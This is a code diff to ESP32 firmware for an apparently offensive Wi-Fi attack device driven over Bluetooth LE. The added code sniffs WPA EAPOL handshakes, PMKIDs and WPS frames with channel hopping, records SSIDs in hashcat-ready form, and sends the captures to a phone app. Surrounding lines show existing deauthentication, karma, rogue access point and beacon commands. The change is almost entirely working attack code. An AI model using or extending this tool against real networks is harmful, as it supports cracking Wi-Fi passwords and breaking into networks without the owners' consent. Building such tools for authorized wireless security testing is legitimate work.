@@ -157,8 +157,8 @@ static uint8_t crc8(const uint8_t *d, int n) {
 // Notifica in chunk pari a MTU-3 (iOS negozia ~185): l'app riassembla.
 static void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len) {
   if (len < 0) len = 0;
-  if (len > 1000) len = 1000;
-  uint8_t f[1024];
+  if (len > 2000) len = 2000;
+  uint8_t f[2048];
   int i = 0;
   f[i++] = 0x5A;
   f[i++] = len & 0xFF;
@@ -232,12 +232,45 @@ class ChrCb : public BLECharacteristicCallbacks {
   }
 };
 
-// ============ sniffer 802.11 (karma + PMKID) ============
+// ============ FASE A: capture EAPOL/PMKID/WPS (promiscuous + channel hop) ============
+struct CapFrame { uint8_t msg; uint16_t len; uint8_t data[480]; };
+struct CapSes {
+  uint8_t bssid[6];
+  uint8_t sta[6];
+  bool pmkid;
+  uint8_t pmkidVal[16];
+  char ssid[33];
+  uint8_t n;
+  CapFrame fr[4];
+};
+struct CapSsidEntry { uint8_t bssid[6]; char ssid[33]; uint8_t len; };
+static volatile bool capOn = false;
+static bool capHop = true;
+static uint8_t capCh = 1;
+static uint8_t capChList[16];
+static uint8_t capChCount = 0;
+static uint8_t capHops = 0;
+static uint32_t capLastHop = 0;
+static volatile uint32_t capFrames = 0;
+static volatile uint32_t capEapol = 0;
+static CapSes capSes[6];
+static int capSesCount = 0;
+static CapSsidEntry capSsidMap[8];
+static int capSsidCount = 0;
+static bool capBackupConn = false;
+static uint8_t capBackupCh = 1;
+static portMUX_TYPE capMux = portMUX_INITIALIZER_UNLOCKED;
+
+// ============ sniffer 802.11 (karma + PMKID + capture) ============
+static void capHandle(const uint8_t *d, int len);
+
 static void snifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
   const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
   const uint8_t *d = pkt->payload;
   int len = (int)pkt->rx_ctrl.sig_len - 4;
   if (len < 24) return;
+
+  if (capOn) capHandle(d, len);
 
   uint8_t subtype = (uint8_t)((d[0] >> 2) & 0x3F);
   if (karmaArmed && !pmkidArmed && subtype == 0x04) {
@@ -290,6 +323,196 @@ static void promiscOff() { esp_wifi_set_promiscuous(false); }
 
 static void setChannel(uint8_t ch) {
   if (ch >= 1 && ch <= 14) esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+}
+
+// ============ FASE A: capture EAPOL/PMKID/WPS ============
+static void capHandle(const uint8_t *d, int len) {
+  capFrames++;
+  uint8_t ftype = (uint8_t)((d[0] >> 2) & 0x3);
+
+  // beacon/probe response → mappa SSID per BSSID (serve a hc22000)
+  if (ftype == 0) {
+    uint8_t sub = (uint8_t)((d[0] >> 4) & 0xF);
+    if ((sub == 8 || sub == 5) && len >= 38) {
+      int o = 36;
+      while (o + 2 <= len) {
+        uint8_t eid = d[o], el = d[o + 1];
+        if (eid == 0) {
+          if (el > 0 && el <= 32 && o + 2 + el <= len) {
+            portENTER_CRITICAL(&capMux);
+            bool found = false;
+            for (int k = 0; k < capSsidCount; k++)
+              if (memcmp(capSsidMap[k].bssid, d + 16, 6) == 0) { found = true; break; }
+            if (!found && capSsidCount < 8) {
+              CapSsidEntry &m = capSsidMap[capSsidCount++];
+              memcpy(m.bssid, d + 16, 6);
+              memcpy(m.ssid, d + o + 2, el);
+              m.ssid[el] = 0;
+              m.len = el;
+            }
+            portEXIT_CRITICAL(&capMux);
+          }
+          break;
+        }
+        o += 2 + el;
+      }
+    }
+    return;
+  }
+
+  if (ftype != 2 || len < 32) return;
+  uint8_t ds = d[1] & 0x03;
+  if (ds == 0 || ds == 3) return;
+  int hdr = 24;
+  if (((d[0] >> 4) & 0xF) & 0x08) hdr += 2;  // QoS data
+  if (hdr + 8 > len) return;
+  const uint8_t *llc = d + hdr;
+  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03 ||
+      llc[6] != 0x88 || llc[7] != 0x8E) return;
+  int eo = hdr + 8;
+  int elen = len - eo;
+  if (elen < 4) return;
+
+  uint8_t etype = d[eo + 1];
+  uint8_t msg = 0;
+  bool pmk = false;
+  uint8_t pmkVal[16] = {0};
+  if (etype == 3 && elen >= 99) {
+    uint16_t ki = (uint16_t)(d[eo + 5] | (d[eo + 6] << 8));
+    bool ack = (ki >> 7) & 1, mic = (ki >> 8) & 1, sec = (ki >> 9) & 1;
+    if (ack && !mic) msg = 1;
+    else if (!ack && mic && !sec) msg = 2;
+    else if (ack && mic) msg = 3;
+    else msg = 4;
+    if (msg == 1 && ds == 0x02) {
+      int kd = d[eo + 97] | (d[eo + 98] << 8);
+      int end = 99 + kd;
+      if (end > elen) end = elen;
+      for (int i = 99; i + 6 <= end;) {
+        uint8_t id = d[eo + i], l = d[eo + i + 1];
+        if (id == 0xDD && l >= 20 && i + 22 <= end &&
+            d[eo + i + 2] == 0x00 && d[eo + i + 3] == 0x0F &&
+            d[eo + i + 4] == 0xAC && d[eo + i + 5] == 0x04) {
+          memcpy(pmkVal, d + eo + i + 6, 16);
+          pmk = true;
+          break;
+        }
+        i += 2 + l;
+      }
+    }
+  } else if (etype == 0) {
+    msg = 0;  // EAP-WSC (WPS): conservato come messaggio 0
+  } else {
+    return;
+  }
+
+  capEapol++;
+  uint8_t bssid[6], sta[6];
+  if (ds == 0x01) { memcpy(bssid, d + 4, 6); memcpy(sta, d + 10, 6); }
+  else { memcpy(bssid, d + 10, 6); memcpy(sta, d + 4, 6); }
+  int flen = len < 480 ? len : 480;
+
+  portENTER_CRITICAL(&capMux);
+  int si = -1;
+  for (int k = 0; k < capSesCount; k++)
+    if (memcmp(capSes[k].bssid, bssid, 6) == 0 && memcmp(capSes[k].sta, sta, 6) == 0) { si = k; break; }
+  if (si < 0) {
+    if (capSesCount < 6) {
+      si = capSesCount++;
+      memset(&capSes[si], 0, sizeof(CapSes));
+      memcpy(capSes[si].bssid, bssid, 6);
+      memcpy(capSes[si].sta, sta, 6);
+    } else {
+      portEXIT_CRITICAL(&capMux);
+      return;
+    }
+  }
+  CapSes &s = capSes[si];
+  if (pmk) { s.pmkid = true; memcpy(s.pmkidVal, pmkVal, 16); }
+  if (!s.ssid[0]) {
+    for (int k = 0; k < capSsidCount; k++)
+      if (memcmp(capSsidMap[k].bssid, bssid, 6) == 0) { memcpy(s.ssid, capSsidMap[k].ssid, 33); break; }
+  }
+  int slot = -1;
+  for (int k = 0; k < s.n; k++) if (s.fr[k].msg == msg) { slot = k; break; }
+  if (slot < 0) {
+    if (s.n < 4) slot = s.n++;
+    else slot = 3;
+  }
+  s.fr[slot].msg = msg;
+  s.fr[slot].len = (uint16_t)flen;
+  memcpy(s.fr[slot].data, d, flen);
+  portEXIT_CRITICAL(&capMux);
+}
+
+static bool capStart(bool hop) {
+  if (pmkidArmed || karmaArmed || beaconActive || scanPending) return false;
+  capSesCount = 0;
+  capSsidCount = 0;
+  capFrames = 0;
+  capEapol = 0;
+  capHops = 0;
+  capHop = hop && !rogue;
+  capBackupConn = (WiFi.status() == WL_CONNECTED);
+  capBackupCh = (uint8_t)(capBackupConn ? WiFi.channel() : apChannel);
+  if (capBackupCh < 1 || capBackupCh > 14) capBackupCh = 1;
+  capOn = true;
+  if (rogue) {
+    capCh = apChannel;
+  } else {
+    capCh = capHop ? (uint8_t)(capChCount ? capChList[0] : 1) : capBackupCh;
+    setChannel(capCh);
+    if (capBackupConn) WiFi.disconnect(false);
+  }
+  capLastHop = millis();
+  promiscOn();
+  Serial.printf("[cap] start hop=%d ch=%d\n", capHop, capCh);
+  return true;
+}
+
+static void capStop() {
+  capOn = false;
+  if (!pmkidArmed && !karmaArmed) promiscOff();
+  if (!rogue) {
+    setChannel(capBackupCh);
+    if (capBackupConn) WiFi.begin(STA_SSID, STA_PASS);
+  }
+  Serial.printf("[cap] stop frames=%lu eapol=%lu ses=%d ch=%d\n",
+                (unsigned long)capFrames, (unsigned long)capEapol, capSesCount, capCh);
+}
+
+static void capTick() {
+  if (!capOn || !capHop || rogue) return;
+  if (millis() - capLastHop < 350) return;
+  capLastHop = millis();
+  capHops++;
+  if (capChCount > 0) capCh = capChList[capHops % capChCount];
+  else capCh = (uint8_t)(1 + (capHops % 13));
+  setChannel(capCh);
+}
+
+static int capBuildDump(int idx, uint8_t *out, int maxOut) {
+  if (idx < 0 || idx >= capSesCount) return -1;
+  CapSes &s = capSes[idx];
+  int i = 0;
+  memcpy(out + i, s.bssid, 6); i += 6;
+  memcpy(out + i, s.sta, 6); i += 6;
+  out[i++] = s.pmkid ? 1 : 0;
+  memcpy(out + i, s.pmkidVal, 16); i += 16;
+  int sl = (int)strlen(s.ssid);
+  if (sl > 32) sl = 32;
+  out[i++] = (uint8_t)sl;
+  memcpy(out + i, s.ssid, sl); i += sl;
+  out[i++] = s.n;
+  for (int k = 0; k < s.n; k++) {
+    if (i + 3 + (int)s.fr[k].len > maxOut) break;
+    out[i++] = s.fr[k].msg;
+    out[i++] = s.fr[k].len & 0xFF;
+    out[i++] = (s.fr[k].len >> 8) & 0xFF;
+    memcpy(out + i, s.fr[k].data, s.fr[k].len);
+    i += s.fr[k].len;
+  }
+  return i;
 }
 
 // ============ raw 802.11 TX ============
@@ -814,6 +1037,7 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
 
     case 0x02: {
+      if (capOn) { sendFrame(0x02, 0x03, (const uint8_t *)"sniff active", 12); break; }
       int seconds = plen > 0 ? pl[0] : 8;
       startScan(seconds);
       break;
@@ -825,7 +1049,7 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
 
     case 0x04:
-      if (rogue) { sendFrame(0x04, 0x03, (const uint8_t *)"rogue active", 12); break; }
+      if (rogue || capOn) { sendFrame(0x04, 0x03, (const uint8_t *)"radio busy", 10); break; }
       if (plen >= 8) {
         bool ok = sendDeauth(pl, pl[6], pl[7]);
         if (ok) sendFrame(0x04, 0x00, (const uint8_t *)"deauth ok", 9);
@@ -836,6 +1060,7 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
 
     case 0x05: {
+      if (capOn) { sendFrame(0x05, 0x03, (const uint8_t *)"sniff active", 12); break; }
       int p = 0;
       int cnt = plen > 0 ? pl[p++] : 0;
       if (cnt > 16) cnt = 16;
@@ -868,6 +1093,7 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
     }
 
     case 0x06:
+      if (capOn) { sendFrame(0x06, 0x03, (const uint8_t *)"sniff active", 12); break; }
       if (plen >= 7) {
         karmaArmed = false;
         memcpy(pmkidTarget, pl, 6);
@@ -886,6 +1112,7 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
 
     case 0x07:
+      if (capOn) capStop();
       if (beaconActive) {
         beaconActive = false;
         if (!rogue) setChannel(apChannel);
@@ -903,6 +1130,7 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
 
     case 0x08: {
+      if (capOn) { sendFrame(0x08, 0x03, (const uint8_t *)"sniff active", 12); break; }
       int p = 0;
       if (plen < 2) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
       int sl = pl[p++];
@@ -1004,6 +1232,7 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
     }
 
     case 0x13: {  // rogueStart
+      if (capOn) { sendFrame(0x13, 0x03, (const uint8_t *)"sniff active", 12); break; }
       if (plen < 2) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
       if (WiFi.status() != WL_CONNECTED) { sendFrame(0x13, 0x02, (const uint8_t *)"sta down", 8); break; }
       int p = 0;
@@ -1215,6 +1444,54 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
+    case 0x30: {  // sniff start: [hop] (0 = canale fisso)
+      if (pmkidArmed || karmaArmed || beaconActive) {
+        sendFrame(0x30, 0x03, (const uint8_t *)"busy", 4);
+        break;
+      }
+      bool hop = plen > 0 ? pl[0] != 0 : true;
+      if (!capStart(hop)) { sendFrame(0x30, 0x03, (const uint8_t *)"busy", 4); break; }
+      sendFrame(0x30, 0x00, (const uint8_t *)"armed", 5);
+      break;
+    }
+
+    case 0x31: {  // sniff stop → statistiche
+      capStop();
+      uint8_t out[10];
+      out[0] = (uint8_t)capSesCount;
+      out[1] = capFrames & 0xFF; out[2] = (capFrames >> 8) & 0xFF;
+      out[3] = (capFrames >> 16) & 0xFF; out[4] = (capFrames >> 24) & 0xFF;
+      out[5] = capEapol & 0xFF; out[6] = (capEapol >> 8) & 0xFF;
+      out[7] = (capEapol >> 16) & 0xFF; out[8] = (capEapol >> 24) & 0xFF;
+      out[9] = capCh;
+      sendFrame(0x31, 0x00, out, 10);
+      break;
+    }
+
+    case 0x32: {  // dump handshake idx → [bssid6][sta6][pmkid?+16][ssidLen][ssid][n][msg+len16+frame]...
+      int idx = plen > 0 ? pl[0] : 0;
+      if (idx < 0 || idx >= capSesCount) { sendFrame(0x32, 0x01, (const uint8_t *)"end", 3); break; }
+      uint8_t out[2000];
+      portENTER_CRITICAL(&capMux);
+      int n = capBuildDump(idx, out, sizeof(out));
+      portEXIT_CRITICAL(&capMux);
+      if (n <= 0) { sendFrame(0x32, 0x02, (const uint8_t *)"bad idx", 7); break; }
+      sendFrame(0x32, 0x00, out, n);
+      break;
+    }
+
+    case 0x33: {  // stats live
+      uint8_t out[10];
+      out[0] = (uint8_t)capSesCount;
+      out[1] = capFrames & 0xFF; out[2] = (capFrames >> 8) & 0xFF;
+      out[3] = (capFrames >> 16) & 0xFF; out[4] = (capFrames >> 24) & 0xFF;
+      out[5] = capEapol & 0xFF; out[6] = (capEapol >> 8) & 0xFF;
+      out[7] = (capEapol >> 16) & 0xFF; out[8] = (capEapol >> 24) & 0xFF;
+      out[9] = capCh;
+      sendFrame(0x33, 0x00, out, 10);
+      break;
+    }
+
     default:
       sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
   }
@@ -1300,6 +1577,36 @@ void loop() {
   portalTick();
   joinTick();
   btTick();
+  capTick();
+
+  // smoke test seriale: S=start hop, R=start fisso, Q=stop, X=stats, D=dump sessioni
+  static String serCmd;
+  while (Serial.available()) {
+    char c = (char)Serial.read();
+    if (c == '\n' || c == '\r') {
+      serCmd.trim();
+      if (serCmd == "S") { Serial.printf("[cap] serial start=%d\n", capStart(true)); }
+      else if (serCmd == "R") { Serial.printf("[cap] serial fixed=%d\n", capStart(false)); }
+      else if (serCmd == "Q") { capStop(); }
+      else if (serCmd == "X") {
+        Serial.printf("[cap] frames=%lu eapol=%lu ses=%d ch=%d on=%d\n",
+                      (unsigned long)capFrames, (unsigned long)capEapol, capSesCount, capCh, (int)capOn);
+      } else if (serCmd == "D") {
+        for (int i = 0; i < capSesCount; i++) {
+          CapSes &s = capSes[i];
+          Serial.printf("[cap] ses%d %02X:%02X:%02X:%02X:%02X:%02X sta %02X:%02X:%02X:%02X:%02X:%02X n=%d pmkid=%d ssid=%s\n",
+                        i, s.bssid[0], s.bssid[1], s.bssid[2], s.bssid[3], s.bssid[4], s.bssid[5],
+                        s.sta[0], s.sta[1], s.sta[2], s.sta[3], s.sta[4], s.sta[5],
+                        s.n, (int)s.pmkid, s.ssid);
+          for (int k = 0; k < s.n; k++)
+            Serial.printf("[cap]   msg=%d len=%d\n", s.fr[k].msg, s.fr[k].len);
+        }
+      }
+      serCmd = "";
+    } else if (serCmd.length() < 8) {
+      serCmd += c;
+    }
+  }
 
   if (joinPending) {
     if (WiFi.status() == WL_CONNECTED && WiFi.SSID() == joinTargetSsid) {
@@ -1317,7 +1624,7 @@ void loop() {
   }
 
   static uint32_t lastReconnect = 0;
-  if (!joinPending && !pmkidArmed && !beaconActive && !rogue && !scanPending &&
+  if (!joinPending && !pmkidArmed && !beaconActive && !rogue && !scanPending && !capOn &&
       WiFi.status() != WL_CONNECTED && millis() - lastReconnect > 10000) {
     lastReconnect = millis();
     WiFi.begin(STA_SSID, STA_PASS);
